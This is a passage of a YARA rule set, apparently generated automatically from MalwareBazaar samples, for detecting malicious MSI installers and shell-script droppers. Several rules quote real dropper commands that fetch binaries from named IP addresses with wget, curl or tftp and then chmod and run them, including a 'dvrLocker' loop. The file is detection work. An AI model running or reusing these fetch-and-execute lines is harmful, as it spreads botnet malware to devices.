/*
   YARA Rule Set
   Author: Sameer P Sheik
   Date: 2025-01-05
   Identifier: evidences
   Reference: https://datalake.abuse.ch/malware-bazaar/daily/
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_009d0664227249a780760ed139ca85eeac7b102a5616fbf78926adb2b113b02e {
   meta:
      description = "evidences - file 009d0664227249a780760ed139ca85eeac7b102a5616fbf78926adb2b113b02e.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "009d0664227249a780760ed139ca85eeac7b102a5616fbf78926adb2b113b02e"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{2B0E2369-D67C-4169-B300-1FB731908F39}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "<EbNw* A" fullword ascii
      $s4 = "bdgsaert" fullword ascii
      $s5 = "ulog f" fullword ascii
      $s6 = "NAo.WfI" fullword ascii
      $s7 = "4mP:\"d" fullword ascii
      $s8 = "Pjy.tYB`#z" fullword ascii
      $s9 = "M<%K:\"" fullword ascii
      $s10 = "/8|0iRc" fullword ascii
      $s11 = "95y!--->|" fullword ascii
      $s12 = ";cFHSpy" fullword ascii
      $s13 = "1a%cr%q" fullword ascii
      $s14 = "^ /vi=z" fullword ascii
      $s15 = "\\i.lke" fullword ascii
      $s16 = "BfmrQ718" fullword ascii
      $s17 = "$%N%Ore" fullword ascii
      $s18 = "md%S%d" fullword ascii
      $s19 = "# NLtX" fullword ascii
      $s20 = "}p%gt%" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule sig_021a320acf8ae6b5044bbd7382795f887194f904600b31b1a869b86722c56a91 {
   meta:
      description = "evidences - file 021a320acf8ae6b5044bbd7382795f887194f904600b31b1a869b86722c56a91.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "021a320acf8ae6b5044bbd7382795f887194f904600b31b1a869b86722c56a91"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "rhWR:\\o" fullword ascii
      $s3 = "roductCode{5B4BCE2C-518E-4215-8842-F8650FD63D61}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = "MHQn3- " fullword ascii
      $s5 = "gfrwefh" fullword ascii
      $s6 = "Y:\"2@S" fullword ascii
      $s7 = "CV /kX" fullword ascii
      $s8 = "SAM:Sdn6Ets" fullword ascii
      $s9 = "rZXQl10" fullword ascii
      $s10 = "kjVoVNg2" fullword ascii
      $s11 = "l}> -x}M)" fullword ascii
      $s12 = "NzgheC6" fullword ascii
      $s13 = "\"* z+s.\"Pz" fullword ascii
      $s14 = "&%lW%9H," fullword ascii
      $s15 = "\\Cladv_2" fullword ascii
      $s16 = "kwqRre#" fullword ascii
      $s17 = "#rLIsYj\"" fullword ascii
      $s18 = "q5.Xkl\\" fullword ascii
      $s19 = "F8pdDO\\p" fullword ascii
      $s20 = "fSxgy3D" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule sig_0a5cbb89f9d5e556499fe2263fb0311167badf22849404a2da98e828b6521e83 {
   meta:
      description = "evidences - file 0a5cbb89f9d5e556499fe2263fb0311167badf22849404a2da98e828b6521e83.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "0a5cbb89f9d5e556499fe2263fb0311167badf22849404a2da98e828b6521e83"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "rhWR:\\o" fullword ascii
      $s3 = "roductCode{5B4BCE2C-518E-4215-8842-F8650FD63D61}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = "MHQn3- " fullword ascii
      $s5 = "Y:\"2@S" fullword ascii
      $s6 = "CV /kX" fullword ascii
      $s7 = "SAM:Sdn6Ets" fullword ascii
      $s8 = "rZXQl10" fullword ascii
      $s9 = "kjVoVNg2" fullword ascii
      $s10 = "l}> -x}M)" fullword ascii
      $s11 = "NzgheC6" fullword ascii
      $s12 = "\"* z+s.\"Pz" fullword ascii
      $s13 = "&%lW%9H," fullword ascii
      $s14 = "\\Cladv_2" fullword ascii
      $s15 = "kwqRre#" fullword ascii
      $s16 = "#rLIsYj\"" fullword ascii
      $s17 = "q5.Xkl\\" fullword ascii
      $s18 = "F8pdDO\\p" fullword ascii
      $s19 = "fSxgy3D" fullword ascii
      $s20 = "JDTa8CJ" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule sig_3e8e8ea02272c71792cb4493025223bee33d3173a0cea0061b51f39564cd8c42 {
   meta:
      description = "evidences - file 3e8e8ea02272c71792cb4493025223bee33d3173a0cea0061b51f39564cd8c42.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "3e8e8ea02272c71792cb4493025223bee33d3173a0cea0061b51f39564cd8c42"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "rhWR:\\o" fullword ascii
      $s3 = "roductCode{5B4BCE2C-518E-4215-8842-F8650FD63D61}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = "MHQn3- " fullword ascii
      $s5 = "gdsrtgrhgk" fullword ascii
      $s6 = "Y:\"2@S" fullword ascii
      $s7 = "CV /kX" fullword ascii
      $s8 = "SAM:Sdn6Ets" fullword ascii
      $s9 = "rZXQl10" fullword ascii
      $s10 = "kjVoVNg2" fullword ascii
      $s11 = "l}> -x}M)" fullword ascii
      $s12 = "NzgheC6" fullword ascii
      $s13 = "\"* z+s.\"Pz" fullword ascii
      $s14 = "&%lW%9H," fullword ascii
      $s15 = "\\Cladv_2" fullword ascii
      $s16 = "kwqRre#" fullword ascii
      $s17 = "#rLIsYj\"" fullword ascii
      $s18 = "q5.Xkl\\" fullword ascii
      $s19 = "F8pdDO\\p" fullword ascii
      $s20 = "fSxgy3D" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule sig_85af2400e0920204ae99cf2257307601e8d5cb14a4c3cefc8f4b9b036a38296c {
   meta:
      description = "evidences - file 85af2400e0920204ae99cf2257307601e8d5cb14a4c3cefc8f4b9b036a38296c.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "85af2400e0920204ae99cf2257307601e8d5cb14a4c3cefc8f4b9b036a38296c"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "rhWR:\\o" fullword ascii
      $s3 = "roductCode{5B4BCE2C-518E-4215-8842-F8650FD63D61}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = "MHQn3- " fullword ascii
      $s5 = "bfgsrghgjh" fullword ascii
      $s6 = "Y:\"2@S" fullword ascii
      $s7 = "CV /kX" fullword ascii
      $s8 = "SAM:Sdn6Ets" fullword ascii
      $s9 = "rZXQl10" fullword ascii
      $s10 = "kjVoVNg2" fullword ascii
      $s11 = "l}> -x}M)" fullword ascii
      $s12 = "NzgheC6" fullword ascii
      $s13 = "\"* z+s.\"Pz" fullword ascii
      $s14 = "&%lW%9H," fullword ascii
      $s15 = "\\Cladv_2" fullword ascii
      $s16 = "kwqRre#" fullword ascii
      $s17 = "#rLIsYj\"" fullword ascii
      $s18 = "q5.Xkl\\" fullword ascii
      $s19 = "F8pdDO\\p" fullword ascii
      $s20 = "fSxgy3D" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule cd0800bc609b298e5bf85491c8cafc7d0e1a658a6062dff6d0b5f6482ee415f3 {
   meta:
      description = "evidences - file cd0800bc609b298e5bf85491c8cafc7d0e1a658a6062dff6d0b5f6482ee415f3.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "cd0800bc609b298e5bf85491c8cafc7d0e1a658a6062dff6d0b5f6482ee415f3"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "rhWR:\\o" fullword ascii
      $s3 = "roductCode{5B4BCE2C-518E-4215-8842-F8650FD63D61}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = "MHQn3- " fullword ascii
      $s5 = "gfdserfg" fullword ascii
      $s6 = "Y:\"2@S" fullword ascii
      $s7 = "CV /kX" fullword ascii
      $s8 = "SAM:Sdn6Ets" fullword ascii
      $s9 = "rZXQl10" fullword ascii
      $s10 = "kjVoVNg2" fullword ascii
      $s11 = "l}> -x}M)" fullword ascii
      $s12 = "NzgheC6" fullword ascii
      $s13 = "\"* z+s.\"Pz" fullword ascii
      $s14 = "&%lW%9H," fullword ascii
      $s15 = "\\Cladv_2" fullword ascii
      $s16 = "kwqRre#" fullword ascii
      $s17 = "#rLIsYj\"" fullword ascii
      $s18 = "q5.Xkl\\" fullword ascii
      $s19 = "F8pdDO\\p" fullword ascii
      $s20 = "fSxgy3D" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule sig_06a94174603a072d5eee1ff190f41d5e7e514477034f092242b5e4ca727a00f8 {
   meta:
      description = "evidences - file 06a94174603a072d5eee1ff190f41d5e7e514477034f092242b5e4ca727a00f8.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "06a94174603a072d5eee1ff190f41d5e7e514477034f092242b5e4ca727a00f8"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{D7A38DDC-AC36-4DEE-8972-DC0C67531B11}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "wrqfegfhghk" fullword ascii
      $s4 = "e:\\l5/:" fullword ascii
      $s5 = "hCRZXN8" fullword ascii
      $s6 = "BQVaZE5" fullword ascii
      $s7 = ">+ :TX" fullword ascii
      $s8 = "*](Ej -" fullword ascii
      $s9 = "vejfbc" fullword ascii
      $s10 = "j~ -C0H#" fullword ascii
      $s11 = "Zt+ LU" fullword ascii
      $s12 = " -`R%l" fullword ascii
      $s13 = "\\zJns-nz`" fullword ascii
      $s14 = "xmBNBU3" fullword ascii
      $s15 = "G(~S* D" fullword ascii
      $s16 = "w\"\"q- " fullword ascii
      $s17 = "+ Z[M-&b1;" fullword ascii
      $s18 = "kuBjNcN" fullword ascii
      $s19 = "=WXdBU}A2" fullword ascii
      $s20 = "&jOiXfr0" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule sig_0f43189434a353d23139e5bab220a0d0b0fd4aa3cff5f873478b0a693bab76ab {
   meta:
      description = "evidences - file 0f43189434a353d23139e5bab220a0d0b0fd4aa3cff5f873478b0a693bab76ab.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "0f43189434a353d23139e5bab220a0d0b0fd4aa3cff5f873478b0a693bab76ab"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "*\"[` 3=3" fullword ascii /* hex encoded string '3' */
      $s3 = "roductCode{E29365CC-8642-4BC3-AA3E-7B7E8084C00C}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = "fdsrgfjh" fullword ascii
      $s5 = "$Yw:\"j" fullword ascii
      $s6 = "UQQ.ENx" fullword ascii
      $s7 = "|O:\"&BX" fullword ascii
      $s8 = "_e'l:\\w" fullword ascii
      $s9 = "|^[%d-#" fullword ascii
      $s10 = "C\\.\".y" fullword ascii
      $s11 = "\\mfqn2\"D" fullword ascii
      $s12 = "ZSjWqu8" fullword ascii
      $s13 = "vRiSkc0" fullword ascii
      $s14 = "+ 2j6c~" fullword ascii
      $s15 = "ahzpdw" fullword ascii
      $s16 = "+ <Ky:" fullword ascii
      $s17 = "Vs[ /C" fullword ascii
      $s18 = "NFbfQG4" fullword ascii
      $s19 = "Tzu{H* " fullword ascii
      $s20 = ",,Cgh -" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_9267cd8abbee9a6af8ee519addf96d715feea53f657603a65e2bd0b22bf3d540 {
   meta:
      description = "evidences - file 9267cd8abbee9a6af8ee519addf96d715feea53f657603a65e2bd0b22bf3d540.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "9267cd8abbee9a6af8ee519addf96d715feea53f657603a65e2bd0b22bf3d540"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "*\"[` 3=3" fullword ascii /* hex encoded string '3' */
      $s3 = "roductCode{E29365CC-8642-4BC3-AA3E-7B7E8084C00C}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = "fdtgwerhgfkj" fullword ascii
      $s5 = "$Yw:\"j" fullword ascii
      $s6 = "UQQ.ENx" fullword ascii
      $s7 = "|O:\"&BX" fullword ascii
      $s8 = "_e'l:\\w" fullword ascii
      $s9 = "|^[%d-#" fullword ascii
      $s10 = "C\\.\".y" fullword ascii
      $s11 = "\\mfqn2\"D" fullword ascii
      $s12 = "ZSjWqu8" fullword ascii
      $s13 = "vRiSkc0" fullword ascii
      $s14 = "+ 2j6c~" fullword ascii
      $s15 = "ahzpdw" fullword ascii
      $s16 = "+ <Ky:" fullword ascii
      $s17 = "Vs[ /C" fullword ascii
      $s18 = "NFbfQG4" fullword ascii
      $s19 = "Tzu{H* " fullword ascii
      $s20 = ",,Cgh -" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule ab331b489ab1bdd86151b1ba72278e37841bec12b461f55b8b7f420e579dd3fe {
   meta:
      description = "evidences - file ab331b489ab1bdd86151b1ba72278e37841bec12b461f55b8b7f420e579dd3fe.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "ab331b489ab1bdd86151b1ba72278e37841bec12b461f55b8b7f420e579dd3fe"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "*\"[` 3=3" fullword ascii /* hex encoded string '3' */
      $s3 = "roductCode{E29365CC-8642-4BC3-AA3E-7B7E8084C00C}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = "fdfserfggk" fullword ascii
      $s5 = "$Yw:\"j" fullword ascii
      $s6 = "UQQ.ENx" fullword ascii
      $s7 = "|O:\"&BX" fullword ascii
      $s8 = "_e'l:\\w" fullword ascii
      $s9 = "|^[%d-#" fullword ascii
      $s10 = "C\\.\".y" fullword ascii
      $s11 = "\\mfqn2\"D" fullword ascii
      $s12 = "ZSjWqu8" fullword ascii
      $s13 = "vRiSkc0" fullword ascii
      $s14 = "+ 2j6c~" fullword ascii
      $s15 = "ahzpdw" fullword ascii
      $s16 = "+ <Ky:" fullword ascii
      $s17 = "Vs[ /C" fullword ascii
      $s18 = "NFbfQG4" fullword ascii
      $s19 = "Tzu{H* " fullword ascii
      $s20 = ",,Cgh -" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule e52ca6f2ae03d8ac45447af89b757f78914dbda60bb1c4bcdba288ff5aa98e56 {
   meta:
      description = "evidences - file e52ca6f2ae03d8ac45447af89b757f78914dbda60bb1c4bcdba288ff5aa98e56.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "e52ca6f2ae03d8ac45447af89b757f78914dbda60bb1c4bcdba288ff5aa98e56"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "*\"[` 3=3" fullword ascii /* hex encoded string '3' */
      $s3 = "roductCode{E29365CC-8642-4BC3-AA3E-7B7E8084C00C}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = "sdfewtrh" fullword ascii
      $s5 = "$Yw:\"j" fullword ascii
      $s6 = "UQQ.ENx" fullword ascii
      $s7 = "|O:\"&BX" fullword ascii
      $s8 = "_e'l:\\w" fullword ascii
      $s9 = "|^[%d-#" fullword ascii
      $s10 = "C\\.\".y" fullword ascii
      $s11 = "\\mfqn2\"D" fullword ascii
      $s12 = "ZSjWqu8" fullword ascii
      $s13 = "vRiSkc0" fullword ascii
      $s14 = "+ 2j6c~" fullword ascii
      $s15 = "ahzpdw" fullword ascii
      $s16 = "+ <Ky:" fullword ascii
      $s17 = "Vs[ /C" fullword ascii
      $s18 = "NFbfQG4" fullword ascii
      $s19 = "Tzu{H* " fullword ascii
      $s20 = ",,Cgh -" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule f67e507d4ab16e5f533d03b46ef9fd28ccae59abff10a9f671c302fd0e2f2db1 {
   meta:
      description = "evidences - file f67e507d4ab16e5f533d03b46ef9fd28ccae59abff10a9f671c302fd0e2f2db1.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "f67e507d4ab16e5f533d03b46ef9fd28ccae59abff10a9f671c302fd0e2f2db1"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "*\"[` 3=3" fullword ascii /* hex encoded string '3' */
      $s3 = "roductCode{E29365CC-8642-4BC3-AA3E-7B7E8084C00C}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = "fawerfefhj" fullword ascii
      $s5 = "$Yw:\"j" fullword ascii
      $s6 = "UQQ.ENx" fullword ascii
      $s7 = "|O:\"&BX" fullword ascii
      $s8 = "_e'l:\\w" fullword ascii
      $s9 = "|^[%d-#" fullword ascii
      $s10 = "C\\.\".y" fullword ascii
      $s11 = "\\mfqn2\"D" fullword ascii
      $s12 = "ZSjWqu8" fullword ascii
      $s13 = "vRiSkc0" fullword ascii
      $s14 = "+ 2j6c~" fullword ascii
      $s15 = "ahzpdw" fullword ascii
      $s16 = "+ <Ky:" fullword ascii
      $s17 = "Vs[ /C" fullword ascii
      $s18 = "NFbfQG4" fullword ascii
      $s19 = "Tzu{H* " fullword ascii
      $s20 = ",,Cgh -" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_10abba88be82d9c6682892c4d609e534d00e80544ea9e38b56ce3ed36962db7c {
   meta:
      description = "evidences - file 10abba88be82d9c6682892c4d609e534d00e80544ea9e38b56ce3ed36962db7c.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "10abba88be82d9c6682892c4d609e534d00e80544ea9e38b56ce3ed36962db7c"
   strings:
      $s1 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://87.121.112.16/m68k    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s2 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://87.121.112.16/spc     -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s3 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://87.121.112.16/arc     -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s4 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://87.121.112.16/arm6    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s5 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://87.121.112.16/mips    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s6 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://87.121.112.16/arm     -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s7 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://87.121.112.16/mpsl    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s8 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://87.121.112.16/ppc     -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s9 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://87.121.112.16/sh4     -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s10 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://87.121.112.16/arm5    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s11 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://87.121.112.16/arm7    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s12 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://87.121.112.16/i686    -O- > o; chmod 777 o; ./o selfrep.wget" fullword ascii
      $s13 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
   condition:
      uint16(0) == 0x2123 and filesize < 4KB and
      8 of them
}

rule sig_20a5a7ca603641d1c664d4afa88410ee60e19c195c0aefef5fd95b1e188a5a56 {
   meta:
      description = "evidences - file 20a5a7ca603641d1c664d4afa88410ee60e19c195c0aefef5fd95b1e188a5a56.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "20a5a7ca603641d1c664d4afa88410ee60e19c195c0aefef5fd95b1e188a5a56"
   strings:
      $s1 = "http_server=\"103.149.87.69\"" fullword ascii
      $s2 = "        wget http://$http_server/le/$a -O -> dvrLocker" fullword ascii
      $s3 = "cd /var/tmp" fullword ascii
      $s4 = "cd /tmp/tmpfs" fullword ascii
      $s5 = "rm -rf dvrLocker" fullword ascii
      $s6 = "cd /tmp" fullword ascii
      $s7 = "cd /dev/shm" fullword ascii
      $s8 = "        ./dvrLocker goaheadNEW 2>&1" fullword ascii
      $s9 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
      $s10 = "n=\"078d9c 1d30df 2e6a56 71b160 9763ac dbf74d 117333 2b27f5 331081 860475 a945bf\"" fullword ascii
      $s11 = "for a in $n" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      8 of them
}

rule sig_2f75c8bc0891bed84c635cba972800bea7389040853ebe6a0ab112d97c91778a {
   meta:
      description = "evidences - file 2f75c8bc0891bed84c635cba972800bea7389040853ebe6a0ab112d97c91778a.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "2f75c8bc0891bed84c635cba972800bea7389040853ebe6a0ab112d97c91778a"
   strings:
      $s1 = "cp /bin/busybox busybox; rm -rf o; curl http://103.149.87.18/mips    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s2 = "cp /bin/busybox busybox; rm -rf o; curl http://103.149.87.18/m68k    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s3 = "cp /bin/busybox busybox; rm -rf o; curl http://103.149.87.18/arc     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s4 = "cp /bin/busybox busybox; rm -rf o; curl http://103.149.87.18/ppc     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s5 = "cp /bin/busybox busybox; rm -rf o; curl http://103.149.87.18/arm6    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s6 = "cp /bin/busybox busybox; rm -rf o; curl http://103.149.87.18/arm     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s7 = "cp /bin/busybox busybox; rm -rf o; curl http://103.149.87.18/mpsl    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s8 = "cp /bin/busybox busybox; rm -rf o; curl http://103.149.87.18/sh4     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s9 = "cp /bin/busybox busybox; rm -rf o; curl http://103.149.87.18/arm5    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s10 = "cp /bin/busybox busybox; rm -rf o; curl http://103.149.87.18/arm7    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s11 = "cp /bin/busybox busybox; rm -rf o; curl http://103.149.87.18/spc     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s12 = "cp /bin/busybox busybox; rm -rf o; curl http://103.149.87.18/i686    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s13 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule sig_55c9997bf109c2595ed3131f94b5e82fe050eb5c085c24c24aba09ea964ad6a6 {
   meta:
      description = "evidences - file 55c9997bf109c2595ed3131f94b5e82fe050eb5c085c24c24aba09ea964ad6a6.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "55c9997bf109c2595ed3131f94b5e82fe050eb5c085c24c24aba09ea964ad6a6"
   strings:
      $s1 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.149.87.69/d/m68k    -O- > o; chmod 777 o; ./o multi" fullword ascii
      $s2 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.149.87.69/d/sh4     -O- > o; chmod 777 o; ./o multi" fullword ascii
      $s3 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.149.87.69/d/arm7    -O- > o; chmod 777 o; ./o multi" fullword ascii
      $s4 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.149.87.69/d/arm     -O- > o; chmod 777 o; ./o multi" fullword ascii
      $s5 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.149.87.69/d/mpsl    -O- > o; chmod 777 o; ./o multi" fullword ascii
      $s6 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.149.87.69/d/arm6    -O- > o; chmod 777 o; ./o multi" fullword ascii
      $s7 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.149.87.69/d/spc     -O- > o; chmod 777 o; ./o multi" fullword ascii
      $s8 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.149.87.69/d/mips    -O- > o; chmod 777 o; ./o multi" fullword ascii
      $s9 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.149.87.69/d/i686    -O- > o; chmod 777 o; ./o multi" fullword ascii
      $s10 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.149.87.69/d/arc     -O- > o; chmod 777 o; ./o multi" fullword ascii
      $s11 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.149.87.69/d/ppc     -O- > o; chmod 777 o; ./o multi" fullword ascii
      $s12 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.149.87.69/d/arm5    -O- > o; chmod 777 o; ./o multi" fullword ascii
      $s13 = "tftp -g -r arm5 103.149.87.69; chmod 777 arm5; ./arm5 multi" fullword ascii
      $s14 = "tftp -g -r sh4 103.149.87.69; chmod 777 sh4; ./sh4 multi" fullword ascii
      $s15 = "tftp -g -r arm7 103.149.87.69; chmod 777 arm7; ./arm7 multi" fullword ascii
      $s16 = "tftp -g -r mips 103.149.87.69; chmod 777 mips; ./mips multi" fullword ascii
      $s17 = "tftp -g -r arm6 103.149.87.69; chmod 777 arm6; ./arm6 multi" fullword ascii
      $s18 = "tftp -g -r mpsl 103.149.87.69; chmod 777 mpsl; ./mpsl multi" fullword ascii
      $s19 = "tftp -g -r spc 103.149.87.69; chmod 777 spc; ./spc multi" fullword ascii
      $s20 = "tftp -g -r arc 103.149.87.69; chmod 777 arc; ./arc multi" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 10KB and
      8 of them
}

rule sig_9c3db05b2e1917e2d8f089cca8a6a0e4329f6e2cbb440231e445f19a0a0f0aea {
   meta:
      description = "evidences - file 9c3db05b2e1917e2d8f089cca8a6a0e4329f6e2cbb440231e445f19a0a0f0aea.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "9c3db05b2e1917e2d8f089cca8a6a0e4329f6e2cbb440231e445f19a0a0f0aea"
   strings:
      $s1 = "cp /bin/busybox busybox; rm -rf o; curl http://87.121.112.16/mpsl    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s2 = "cp /bin/busybox busybox; rm -rf o; curl http://87.121.112.16/sh4     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s3 = "cp /bin/busybox busybox; rm -rf o; curl http://87.121.112.16/i686    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
